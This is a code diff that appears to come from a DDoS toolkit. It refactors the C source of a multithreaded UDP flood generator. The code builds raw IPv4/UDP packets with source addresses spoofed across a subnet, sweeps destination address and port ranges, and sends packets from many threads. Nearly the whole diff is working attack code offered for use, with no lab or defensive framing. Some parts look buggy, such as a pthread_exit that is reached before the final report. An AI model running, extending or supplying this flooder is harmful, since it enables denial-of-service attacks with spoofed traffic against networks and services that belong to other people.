@@ -3,67 +3,56 @@
 #include "../base/subnet_mask.h"
 #include "../ddos/udp_flood.h"
 
+#define REQUEST_PER_THREAD 1000
+
 #define DATA "Hello, This is Data!"
 
-int udp_total;
-int udp_produced;
+unsigned long udp_total;
+unsigned long udp_produced;
 
-int udp_per_seicmp_cond;
-int udp_duration;
-double udp_elapsed_time;
-
+char udp_src_ip[16] = {0, }; // fixed value
 char udp_dest_ip[16] = {0, };
-char udp_src_ip[16] = {0, };
-char udp_now_ip[16] = {0, };
-int udp_src_port;
-int udp_dest_port;
+int udp_src_mask;
+int udp_dest_mask;
+int udp_dest_port_start;
+int udp_dest_port_end;
+
+char udp_now_src[16] = {0, }; // variable
+char udp_now_dest[16] = {0, };
+int udp_now_port = 0;
 
 pthread_mutex_t udp_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 pthread_cond_t udp_cond;
 
-int udp_generated_count;
-
-
 void udp_flood_print_usage(void)
 {
-	printf("UDP flood Usage : [Src-IP] [Subnet-Mask(0~32)] [Dest-IP] [Src-Port] [Dest-Port] [# thread] [# requests] \n");
+	printf("UDP flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests, Default: 1 Loop] \n");
 }
 
-void* generate_udp_request(void *data)
+void *generate_udp_request(void *data)
 {
-	int mask = *((int *)data);
-
 	int sock = make_socket(IPPROTO_UDP);
 	while (1) {
-		char tmp_udp_dest_ip[16], tmp_udp_src_ip[16];
-		int tmp_udp_src_port = udp_src_port;
-		int tmp_udp_dest_port = udp_dest_port;
-		strcpy(tmp_udp_dest_ip, udp_dest_ip);
-		strcpy(tmp_udp_src_ip, udp_src_ip);
-
 		struct udphdr *p;
 		char buffer[sizeof(struct udphdr)];
-
 		memset(buffer, 0x00, sizeof(struct udphdr));
 
 		pthread_mutex_lock(&udp_mutex);
 
-		masking_next_ip_addr(tmp_udp_src_ip, udp_now_ip, mask);		// increase udp_now_ip with subnet masking
+		generator(udp_src_ip, udp_dest_ip, udp_src_mask, udp_dest_mask, udp_dest_port_start, udp_dest_port_end, udp_now_src, udp_now_dest, &udp_now_port);
 
 		//make protocol
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_UDP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_now_ip));
-
-
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tmp_udp_dest_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(udp_now_src));
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(udp_now_dest));
 
 		p = (struct udphdr *) buffer;
 		p->check = 0;
-		p->src_port = htons(tmp_udp_src_port);
-		p->dest_port = htons(tmp_udp_dest_port);
+		p->src_port = htons(0);
+		p->dest_port = htons(udp_now_port);
 		strcpy(p->data, DATA);
 		p->len = htons(strlen(DATA));
 
@@ -76,8 +65,7 @@ void* generate_udp_request(void *data)
 			return 0;
 		}
 
-		send_packet(sock, ipv4_h, packet, tmp_udp_src_port);
-		udp_generated_count++;
+		send_packet(sock, ipv4_h, packet, udp_now_port);
 		free(packet);
 		udp_produced++;
 
@@ -91,50 +79,35 @@ void* generate_udp_request(void *data)
 void udp_flood_run(char *argv[])
 {
 	int argc = 0;
-	udp_generated_count=0;
 
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 
-	if (argc != 7) {
+	if (argc != 3 && argc != 4) {
 		udp_flood_print_usage();
 		return;
 	}
 
-	strcpy(udp_src_ip, argv[0]);
-	int mask = atoi(argv[1]);
-
-	udp_src_port = atoi(argv[3]);
-	udp_dest_port = atoi(argv[4]);
+	split_ip_mask_port(argv, udp_src_ip, udp_dest_ip, &udp_src_mask, &udp_dest_mask, &udp_dest_port_start, &udp_dest_port_end);
 
 	udp_produced = 0;
-	udp_total = atoi(argv[6]);
 
-	int num_threads = atoi(argv[5]);
+	if(argc == 4) udp_total = atoi(argv[3]);
+	else udp_total = (unsigned long)pow(2, 32-udp_src_mask) * (unsigned long)pow(2, 32-udp_dest_mask) * (udp_dest_port_end-udp_dest_port_start+1);
 
-	strcpy(udp_dest_ip, argv[2]);
+	int num_threads = udp_total / REQUEST_PER_THREAD;
 
 	int *generate_thread_id;
-	//pthread_t *generate_thread;
 	pthread_t generate_thread[9999];
 
-
-	//generate_thread_id = (int*) malloc(sizeof(int) * (num_threads+1));
-	//generate_thread = (pthread_t*) malloc(sizeof(pthread_t) * (num_threads+1));
 	int i;
 
 
-	printf("Sending UDP requests to %s using %d threads\n",udp_dest_ip, num_threads);
-
-/*
-	for (i = 0; i < num_threads; i++)
-		generate_thread_id[i] = mask;
-*/
+	printf("Sending UDP requests to %s using %d threads\n",argv[1], num_threads);
 
 	for (i = 0; i < num_threads; i++) 
-		pthread_create(&generate_thread[i], NULL, generate_udp_request, &mask);
-			//(void*) &generate_thread_id[i]);
+		pthread_create(&generate_thread[i], NULL, generate_udp_request, NULL);
 
 	for (i = 0; i < num_threads; i++) {
 		void *status;
@@ -145,9 +118,5 @@ void udp_flood_run(char *argv[])
 	pthread_mutex_destroy(&udp_mutex);
 	pthread_exit(NULL);
 
-	printf("UDP flood finished\nTotal %d packets sent.\n",udp_generated_count);
-
-	//free(generate_thread_id);
-	//free(generate_thread);
-	//free(udp_src_ip);
+	printf("UDP flood finished\nTotal %lu packets sent.\n",udp_produced);
 }
